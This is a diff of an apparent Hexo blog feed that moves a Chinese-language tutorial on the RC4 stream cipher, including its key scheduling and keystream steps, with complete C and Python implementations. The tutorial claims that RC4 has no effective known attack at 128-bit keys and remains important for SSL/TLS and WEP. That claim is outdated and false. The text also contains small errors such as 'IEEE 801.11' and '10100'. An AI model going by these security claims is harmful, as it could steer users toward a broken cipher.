-<h4 id="②-初始密钥（由用户输入），长度任意"><a href="#②-初始密钥（由用户输入），长度任意" class="headerlink" title="② 初始密钥（由用户输入），长度任意"></a>② 初始密钥（由用户输入），长度任意</h4><p>&emsp;&emsp;建立一个临时向量T。将密钥的值循环复制到T向量如果输入长度小于256个字节，则进行轮转，直到填满</p>
-<ul>
-<li>例如输入密钥的是1,2,3,4,5，那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5……</li>
-</ul>
-<p>&emsp;&emsp;<strong>由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2）</strong></p>
-<h4 id="③-开始对状态向量S进行置换操作（用来打乱初始种子1）"><a href="#③-开始对状态向量S进行置换操作（用来打乱初始种子1）" class="headerlink" title="③ 开始对状态向量S进行置换操作（用来打乱初始种子1）"></a>③ 开始对状态向量S进行置换操作（用来打乱初始种子1）</h4><p>&emsp;&emsp;按照下列规则进行，从第零个字节开始，执行256次，保证每个字节都得到处理</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">    j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">    swap(S[i],S[j]);</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;因为对S的操作仅是交换，S仍然包含所有值为0-255的元素。</p>
-<h3 id="（3）密钥流的生成与加密"><a href="#（3）密钥流的生成与加密" class="headerlink" title="（3）密钥流的生成与加密"></a>（3）密钥流的生成与加密</h3><p>&emsp;&emsp;假设我的明文字节数是datalength=1024个字节（当然可以是任意个字节）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123; <span class="comment">// 相当于执行1024次，这样生成的密钥流也是1024个字节</span></span><br><span class="line">    i = (i+<span class="number">1</span>)mod256;</span><br><span class="line">    j = (j+S[i])mod256;</span><br><span class="line">    swap(S[i],S[j]);</span><br><span class="line">    t = (S[i]+S[j])mod256;</span><br><span class="line">    k = S[t]; 这里的k就是当前生成的一个密钥流中的一位</span><br><span class="line">    <span class="comment">// 可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok</span></span><br><span class="line">    data[] = data[]^k;  <span class="comment">// 进行加密，^是异或运算符</span></span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;解密按照前面写的，异或两次就是原文，所以只要把密钥流重新拿过来异或一次就能得到原文了</p>
-<h1 id="三、完整算法实现"><a href="#三、完整算法实现" class="headerlink" title="三、完整算法实现"></a>三、完整算法实现</h1><h2 id="1、C"><a href="#1、C" class="headerlink" title="1、C"></a>1、C</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//程序开始</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">&quot;justfortest&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">&quot;这是一个用来加密的数据Data&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s,length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));<span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;完成对S[i]的初始化，如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)<span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经初始化，现在加密:\n\n&quot;</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经加密，现在解密:\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//程序完</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2、Python"><a href="#2、Python" class="headerlink" title="2、Python"></a>2、Python</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># rc4.<span class="function">py</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> base64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">rc4_init_sbox</span><span class="params">(key)</span>:</span></span><br><span class="line"><span class="function">    s_box </span>= <span class="built_in">list</span>(range(<span class="number">256</span>))  # 没管秘钥小于<span class="number">256</span>的情况，小于<span class="number">256</span>不断重复填充即可</span><br><span class="line">    length = len(key)</span><br><span class="line">    <span class="meta"># print(<span class="meta-string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">        T.append(key[i % length])</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(T[i])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    print(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rc4_encrypt(s_box, data):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = len(data)</span><br><span class="line">    <span class="keyword">for</span> k in range(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(chr(ord(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;RC4加密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    print(<span class="string">&quot;RC4加密后(Base64编码)的字c符串是:&quot;</span> + str(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> str(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rc4_decrypt(s_box, data):</span><br><span class="line">    data = base64.b64decode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    data = bytes.decode(data)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = len(data)</span><br><span class="line">    <span class="keyword">for</span> k in range(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(chr(ord(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;RC4解密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="meta"># main.py</span></span><br><span class="line">from rc4 <span class="keyword">import</span> rc4_init_sbox, rc4_encrypt, rc4_decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        function = input(<span class="string">&quot;E to encrypt or D to decrypt for rc4:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> function.upper() == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            data = input(<span class="string">&quot;请输入你要进行RC4加密的数据：&quot;</span>)</span><br><span class="line">            key = input(<span class="string">&quot;请输入RC4加密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_encrypt(s_box, data)</span><br><span class="line">        elif function.upper() == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            data = input(<span class="string">&quot;请输入你要进行RC4解密的数据：&quot;</span>)</span><br><span class="line">            key = input(<span class="string">&quot;请输入RC4解密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_decrypt(s_box, data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;请输入正确的功能&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>参考链接：</p>
-<ul>
-<li><p><a href="https://www.cnblogs.com/gambler/p/9075415.html">https://www.cnblogs.com/gambler/p/9075415.html</a></p>
-</li>
-<li><p><a href="https://www.cnblogs.com/block2016/p/5601925.html">https://www.cnblogs.com/block2016/p/5601925.html</a></p>
-</li>
-<li><p><a href="https://www.jianshu.com/p/d9ad5fc524ec">https://www.jianshu.com/p/d9ad5fc524ec</a></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>密码学</category>
-      </categories>
-      <tags>
-        <tag>密码学</tag>
       </tags>
   </entry>
   <entry>
@@ -640,6 +579,67 @@
       <tags>
         <tag>CTF</tag>
         <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RC4加密算法</title>
+    <url>/post/9dd1bdb.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;RC4加密算法是一种对称加密算法</p>
+<h1 id="一、对称加密算法"><a href="#一、对称加密算法" class="headerlink" title="一、对称加密算法"></a>一、对称加密算法</h1><p>&emsp;&emsp;对称加密(也叫私钥加密)指加密和解密使用相同<a href="http://baike.baidu.com/view/934.htm">密钥</a>的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信的安全性至关重要。 </p>
+<h1 id="二、RC4加密算法"><a href="#二、RC4加密算法" class="headerlink" title="二、RC4加密算法"></a>二、RC4加密算法</h1><h2 id="1、预备知识"><a href="#1、预备知识" class="headerlink" title="1、预备知识"></a>1、预备知识</h2><h3 id="（1）异或"><a href="#（1）异或" class="headerlink" title="（1）异或"></a>（1）异或</h3><p>&emsp;&emsp;学习RC4加密算法之前，首先要知道：<strong>对明文使用同一个密钥异或两次最后是得到原文的</strong></p>
+<h3 id="（2）流密码"><a href="#（2）流密码" class="headerlink" title="（2）流密码"></a>（2）流密码</h3><h4 id="①-定义"><a href="#①-定义" class="headerlink" title="① 定义"></a>① 定义</h4><p>&emsp;&emsp;流密码是对称密码算法，从明文输入流逐位或逐字节产生密文输出。</p>
+<p>&emsp;&emsp;流密码类似于“一次一密”，不同的是“一次一密”使用的是真正的随机数流，而流密码使用的是伪随机数流。</p>
+<h4 id="②-实例"><a href="#②-实例" class="headerlink" title="② 实例"></a>② 实例</h4><p>&emsp;&emsp;使用最广泛的流密码是RC4</p>
+<h4 id="③-流密码结构"><a href="#③-流密码结构" class="headerlink" title="③ 流密码结构"></a>③ 流密码结构</h4><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015605787-f3c732e3-7fb2-42bf-ad9a-46141b10a8b1.png" alt="img"></p>
+<h4 id="④-设计流密码的主要因素"><a href="#④-设计流密码的主要因素" class="headerlink" title="④ 设计流密码的主要因素"></a>④ 设计流密码的主要因素</h4><ol>
+<li><p>加密序列的周期要长，若出现重复的周期过短，容易被破解</p>
+</li>
+<li><p>密钥流应该尽可能地接近真正随机数流的特征</p>
+</li>
+<li><p>密钥长度要长，以避免穷举攻击</p>
+</li>
+</ol>
+<h2 id="2、RC4算法介绍"><a href="#2、RC4算法介绍" class="headerlink" title="2、RC4算法介绍"></a>2、RC4算法介绍</h2><p>&emsp;&emsp;RC4算法是Ron Rivest为RSA公司在1987年设计的一种流密码，作为RSA的商业机密直到1994年才被匿名公布于Internet。</p>
+<p>&emsp;&emsp;该算法是一个可变密钥长度、面向字节操作的流密码。该算法以<strong>随机置换</strong>作为<strong>基础</strong>，其密码周期很可能大于10100，且该算法的运行速度很快。</p>
+<p>&emsp;&emsp;RC4被用于为网络浏览器和服务器间通信而制定的SSL/TLS（安全套接字协议/传输层安全协议）标准中，以及作为IEEE 801.11无线局域网标准一部分的WEP(Wired Equivalent Privacy)协议和新的WiFi受保护访问协议（WPA）中<strong>。****从这些应用来看，RC4构成了当今网络通信的非常重要的部分，因此这个算法非常重要。</strong></p>
+<p>&emsp;&emsp;RC4算法的特点是算法简单，运行速度快，而且密钥长度是可变的，可变范围为1-256字节(8-2048比特)，在如今技术支持的前提下，当密钥长度为128比特时，用暴力法搜索密钥已经不太可行，所以可以预见RC4的密钥范围任然可以在今后相当长的时间里抵御暴力搜索密钥的攻击。实际上，如今也没有找到对于128bit密钥长度的RC4加密算法的有效攻击方法。  </p>
+<h2 id="3、RC4加密原理"><a href="#3、RC4加密原理" class="headerlink" title="3、RC4加密原理"></a>3、RC4加密原理</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638015993488-6e14d89f-c789-4c1b-b5b2-5c431304f2d9.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638018567039-e5fed088-41f6-4467-8f34-52543c690500.png" alt="img"></p>
+<p>&emsp;&emsp;RC4算法的原理很简单，包括<strong>初始化算法（KSA）</strong>和**伪随机子密码生成算法（PRGA)**两大部分。</p>
+<h3 id="（1）初始化算法（KSA）"><a href="#（1）初始化算法（KSA）" class="headerlink" title="（1）初始化算法（KSA）"></a>（1）初始化算法（KSA）</h3><h4 id="①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）"><a href="#①-初始化状态向量S（256字节，用来作为密钥流生成的种子1）" class="headerlink" title="① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）"></a>① 初始化状态向量S（256字节，用来作为密钥流生成的种子1）</h4><p>&emsp;&emsp;按照升序，给每个字节赋值0,1,2,3,4,5,6……,254,255</p>
+<h4 id="②-初始密钥（由用户输入），长度任意"><a href="#②-初始密钥（由用户输入），长度任意" class="headerlink" title="② 初始密钥（由用户输入），长度任意"></a>② 初始密钥（由用户输入），长度任意</h4><p>&emsp;&emsp;建立一个临时向量T。将密钥的值循环复制到T向量如果输入长度小于256个字节，则进行轮转，直到填满</p>
+<ul>
+<li>例如输入密钥的是1,2,3,4,5，那么填入的是1,2,3,4,5,1,2,3,4,5,1,2,3,4,5……</li>
+</ul>
+<p>&emsp;&emsp;<strong>由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2）</strong></p>
+<h4 id="③-开始对状态向量S进行置换操作（用来打乱初始种子1）"><a href="#③-开始对状态向量S进行置换操作（用来打乱初始种子1）" class="headerlink" title="③ 开始对状态向量S进行置换操作（用来打乱初始种子1）"></a>③ 开始对状态向量S进行置换操作（用来打乱初始种子1）</h4><p>&emsp;&emsp;按照下列规则进行，从第零个字节开始，执行256次，保证每个字节都得到处理</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">    j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">    swap(S[i],S[j]);</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;因为对S的操作仅是交换，S仍然包含所有值为0-255的元素。</p>
+<h3 id="（3）密钥流的生成与加密"><a href="#（3）密钥流的生成与加密" class="headerlink" title="（3）密钥流的生成与加密"></a>（3）密钥流的生成与加密</h3><p>&emsp;&emsp;假设我的明文字节数是datalength=1024个字节（当然可以是任意个字节）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>;</span><br><span class="line">j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123; <span class="comment">// 相当于执行1024次，这样生成的密钥流也是1024个字节</span></span><br><span class="line">    i = (i+<span class="number">1</span>)mod256;</span><br><span class="line">    j = (j+S[i])mod256;</span><br><span class="line">    swap(S[i],S[j]);</span><br><span class="line">    t = (S[i]+S[j])mod256;</span><br><span class="line">    k = S[t]; 这里的k就是当前生成的一个密钥流中的一位</span><br><span class="line">    <span class="comment">// 可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok</span></span><br><span class="line">    data[] = data[]^k;  <span class="comment">// 进行加密，^是异或运算符</span></span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;解密按照前面写的，异或两次就是原文，所以只要把密钥流重新拿过来异或一次就能得到原文了</p>
+<h1 id="三、完整算法实现"><a href="#三、完整算法实现" class="headerlink" title="三、完整算法实现"></a>三、完整算法实现</h1><h2 id="1、C"><a href="#1、C" class="headerlink" title="1、C"></a>1、C</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//程序开始</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> longULONG;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*初始化函数*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*加解密*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*s, <span class="keyword">unsigned</span> <span class="keyword">char</span>*Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k&lt;Len; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;, s2[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//S-box</span></span><br><span class="line">    <span class="keyword">char</span> key[<span class="number">256</span>] = &#123; <span class="string">&quot;justfortest&quot;</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> pData[<span class="number">512</span>] = <span class="string">&quot;这是一个用来加密的数据Data&quot;</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len = <span class="built_in">strlen</span>(pData);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;key=%s,length=%d\n\n&quot;</span>, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    rc4_init(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)key, <span class="built_in">strlen</span>(key));<span class="comment">//已经完成了初始化</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;完成对S[i]的初始化，如下：\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, s[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &amp;&amp; (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">256</span>; i++)<span class="comment">//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！</span></span><br><span class="line">    &#123;</span><br><span class="line">        s2[i] = s[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经初始化，现在加密:\n\n&quot;</span>);</span><br><span class="line">    rc4_crypt(s, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//加密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已经加密，现在解密:\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">//rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥</span></span><br><span class="line">    rc4_crypt(s2, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)pData, len);<span class="comment">//解密</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pData=%s\n\n&quot;</span>, pData);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//程序完</span></span><br></pre></td></tr></table></figure>
+
